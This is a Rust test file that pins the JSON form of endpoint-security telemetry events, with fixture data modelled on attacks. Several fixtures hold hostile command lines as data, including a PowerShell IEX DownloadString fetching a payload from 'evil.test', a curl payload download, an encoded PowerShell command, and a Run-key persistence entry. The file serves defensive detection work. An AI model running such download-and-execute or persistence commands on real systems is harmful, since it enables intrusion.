//! Golden-fixture tests: the serialized form of every event type is pinned by the
//! files under `tests/fixtures/v1/`. A failure here means a serialization-visible
//! schema change — that is a `SCHEMA_VERSION` bump and a new fixture directory, never
//! an edit to these files (see crate docs).

use std::net::IpAddr;

use schema::detection::{Detection, DetectionSource, ScoreAttribution, Severity};
use schema::{
    AssemblyLoadEvent, ConnectEvent, DnsQueryEvent, Event, EventMeta, ExecEvent, FileOpenEvent,
    ImageLoadEvent, RegistrySetEvent, ScriptBlockEvent, User, WmiActivityEvent,
};

fn fixture(name: &str) -> serde_json::Value {
    let path = format!(
        "{}/tests/fixtures/v{}/{name}.json",
        env!("CARGO_MANIFEST_DIR"),
        schema::SCHEMA_VERSION,
    );
    serde_json::from_str(&std::fs::read_to_string(&path).expect(&path)).expect(&path)
}

/// Serialize `event`, compare against the fixture, and check the round trip.
fn assert_golden(event: &Event, name: &str) {
    let serialized = serde_json::to_value(event).unwrap();
    assert_eq!(serialized, fixture(name), "fixture mismatch: {name}");
    let back: Event = serde_json::from_value(serialized).unwrap();
    assert_eq!(&back, event, "round trip mismatch: {name}");
}

#[test]
fn exec_unix_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix {
                    uid: 1000,
                    gid: 1000,
                },
                timestamp_ns: 1_756_900_000_123_456_789,
                comm: "bash".into(),
            },
            image_path: "/usr/bin/curl".into(),
            cmdline: "curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh".into(),
            argv: [
                "curl",
                "-fsSL",
                "https://example.test/payload.sh",
                "-o",
                "/tmp/payload.sh",
            ]
            .map(String::from)
            .into(),
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        "exec",
    );
}

#[test]
fn exec_windows_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 5120,
                ppid: 620,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x3000),
                },
                timestamp_ns: 1_756_900_001_000_000_000,
                comm: "powershell.exe".into(),
            },
            image_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
            cmdline: "powershell.exe -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA".into(),
            argv: vec![],
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        "exec_windows",
    );
}

#[test]
fn exec_lineage_golden() {
    // Parent lineage captured at exec time (Word spawning cmd — the classic
    // parent→child transition that lineage features exist to make expensive to fake).
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 6100,
                ppid: 4988,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-1001".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_004_000_000_000,
                comm: "cmd.exe".into(),
            },
            image_path: r"C:\Windows\System32\cmd.exe".into(),
            cmdline: "cmd.exe /c whoami".into(),
            argv: vec![],
            parent_comm: Some("winword.exe".into()),
            parent_image_path: Some(
                r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE".into(),
            ),
            sha256: None,
            signature: None,
        }),
        "exec_lineage",
    );
}

#[test]
fn detection_ml_golden() {
    // An ML detection is never a bare score: registry identity + attributions travel
    // with it (docs/detection/ml.md, "Explanations at detection time").
    let detection = Detection {
        timestamp_ns: 1_756_900_005_000_000_000,
        severity: Severity::High,
        title: "T0 cmdline anomaly".into(),
        source: DetectionSource::Ml {
            tier: 0,
            model_id: "t0-cmdline-linux".into(),
            model_version: "2026.09.0".into(),
        },
        score: Some(0.91),
        attributions: vec![
            ScoreAttribution {
                feature: "entropy".into(),
                value: 5.83,
                contribution: 0.41,
            },
            ScoreAttribution {
                feature: "max_token_length".into(),
                value: 812.0,
                contribution: 0.27,
            },
        ],
        events: vec![Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix {
                    uid: 1000,
                    gid: 1000,
                },
                timestamp_ns: 1_756_900_004_123_456_789,
                comm: "bash".into(),
            },
            image_path: "/usr/bin/python3".into(),
            cmdline: "python3 -c print(1)".into(),
            argv: ["python3", "-c", "print(1)"].map(String::from).into(),
            parent_comm: Some("bash".into()),
            parent_image_path: None,
            sha256: None,
            signature: None,
        })],
    };
    let serialized = serde_json::to_value(&detection).unwrap();
    assert_eq!(serialized, fixture("detection_ml"), "fixture mismatch");
    let back: Detection = serde_json::from_value(serialized).unwrap();
    assert_eq!(back, detection, "round trip mismatch");
}

#[test]
fn file_open_golden() {
    assert_golden(
        &Event::FileOpen(FileOpenEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_002_000_000_000,
                comm: "cron".into(),
            },
            path: "/etc/cron.d/backdoor".into(),
            flags: 0o1101, // O_WRONLY | O_CREAT | O_TRUNC
        }),
        "file_open",
    );
}

#[test]
fn dns_query_golden() {
    assert_golden(
        &Event::DnsQuery(DnsQueryEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unknown,
                timestamp_ns: 1_756_900_010_000_000_000,
                comm: "chrome-update.exe".into(),
            },
            query: "beacon.example.test".into(),
            qtype: 1,
            result: Some("type:1 172.67.143.127;".into()),
            status: 0,
        }),
        "dns_query",
    );
}

#[test]
fn wmi_activity_golden() {
    // EID 24 — method invocation (Win32_Process.Create → T1047 process spawn via WMI).
    assert_golden(
        &Event::WmiActivity(WmiActivityEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_050_000_000_000,
                comm: "wmic.exe".into(),
            },
            namespace: r"ROOT\CIMv2".into(),
            query: None,
            method: Some("Win32_Process.Create".into()),
        }),
        "wmi_activity",
    );
}

#[test]
fn script_block_golden() {
    assert_golden(
        &Event::ScriptBlock(ScriptBlockEvent {
            meta: EventMeta {
                pid: 5120,
                ppid: 620,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x3000),
                },
                timestamp_ns: 1_756_900_040_000_000_000,
                comm: "powershell.exe".into(),
            },
            script_block_id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890".into(),
            path: None,
            text: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/payload.ps1')"
                .into(),
            message_number: 1,
            message_total: 1,
        }),
        "script_block",
    );
}

#[test]
fn image_load_golden() {
    assert_golden(
        &Event::ImageLoad(ImageLoadEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_030_000_000_000,
                comm: "powershell.exe".into(),
            },
            image_path: r"C:\Windows\System32\amsi.dll".into(),
        }),
        "image_load",
    );
}

#[test]
fn registry_set_golden() {
    assert_golden(
        &Event::RegistrySet(RegistrySetEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_020_000_000_000,
                comm: "chrome-update.exe".into(),
            },
            key: r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run".into(),
            value_name: "ChromeUpdate".into(),
            data_type: 1,
            data: Some(r"C:\Users\Public\chrome-update.exe".into()),
        }),
        "registry_set",
    );
}

#[test]
fn assembly_load_golden() {
    // In-memory .NET assembly — execute-assembly / fileless injection signal.
    // flags = 0x2 (dynamic): the only kind the sensor forwards; file-backed loads
    // are dropped at the provider to avoid high-volume noise.
    assert_golden(
        &Event::AssemblyLoad(AssemblyLoadEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_060_000_000_000,
                comm: "powershell.exe".into(),
            },
            assembly_name: "MyPayload, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
                .into(),
            flags: 2,
        }),
        "assembly_load",
    );
}

#[test]
fn connect_v6_golden() {
    assert_golden(
        &Event::Connect(ConnectEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unknown,
                timestamp_ns: 1_756_900_003_000_000_000,
                comm: "beacon".into(),
            },
            daddr: "2001:db8::1337".parse::<IpAddr>().unwrap(),
            dport: 8443,
        }),
        "connect",
    );
}

#[test]
fn exec_enriched_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 6001,
                ppid: 700,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_005_000_000_000,
                comm: "payload".into(),
            },
            image_path: "/tmp/payload".into(),
            cmdline: "/tmp/payload".into(),
            argv: vec!["/tmp/payload".into()],
            parent_comm: None,
            parent_image_path: None,
            sha256: Some("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad".into()),
            signature: Some(schema::Signature::Unsigned),
        }),
        "exec_enriched",
    );
}

#[test]
fn unbounded_cmdline_survives() {
    // Audit F-4: multi-kilobyte encoded command lines must round-trip untouched.
    let long = format!("powershell.exe -EncodedCommand {}", "A".repeat(8 * 1024));
    let event = Event::Exec(ExecEvent {
        meta: EventMeta {
            pid: 1,
            ppid: 0,
            user: User::Unknown,
            timestamp_ns: 0,
            comm: "powershell.exe".into(),
        },
        image_path: r"C:\long\path\that\exceeds\the\old\256\byte\limit".repeat(8),
        cmdline: long.clone(),
        argv: vec![],
        parent_comm: None,
        parent_image_path: None,
        sha256: None,
        signature: None,
    });
    let back: Event = serde_json::from_str(&serde_json::to_string(&event).unwrap()).unwrap();
    match &back {
        Event::Exec(e) => assert_eq!(e.cmdline, long),
        other => panic!("wrong variant: {other:?}"),
    }
}

#[test]
fn meta_accessor_covers_all_variants() {
    let meta = EventMeta {
        pid: 7,
        ppid: 1,
        user: User::Unix { uid: 1, gid: 1 },
        timestamp_ns: 42,
        comm: "x".into(),
    };
    let events = [
        Event::Exec(ExecEvent {
            meta: meta.clone(),
            image_path: String::new(),
            cmdline: String::new(),
            argv: vec![],
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        Event::FileOpen(FileOpenEvent {
            meta: meta.clone(),
            path: String::new(),
            flags: 0,
        }),
        Event::Connect(ConnectEvent {
            meta: meta.clone(),
            daddr: "10.0.0.1".parse::<IpAddr>().unwrap(),
            dport: 80,
        }),
        Event::DnsQuery(DnsQueryEvent {
            meta: meta.clone(),
            query: String::new(),
            qtype: 1,
            result: None,
            status: 0,
        }),
        Event::RegistrySet(RegistrySetEvent {
            meta: meta.clone(),
            key: String::new(),
            value_name: String::new(),
            data_type: 1,
            data: None,
        }),
        Event::ImageLoad(ImageLoadEvent {
            meta: meta.clone(),
            image_path: String::new(),
        }),
        Event::ScriptBlock(ScriptBlockEvent {
            meta: meta.clone(),
            script_block_id: String::new(),
            path: None,
            text: String::new(),
            message_number: 1,
            message_total: 1,
        }),
        Event::WmiActivity(WmiActivityEvent {
            meta: meta.clone(),
            namespace: String::new(),
            query: None,
            method: None,
        }),
        Event::AssemblyLoad(AssemblyLoadEvent {
            meta: meta.clone(),
            assembly_name: String::new(),
            flags: 2,
        }),
    ];
    for e in &events {
        assert_eq!(e.meta().pid, 7);
    }
}
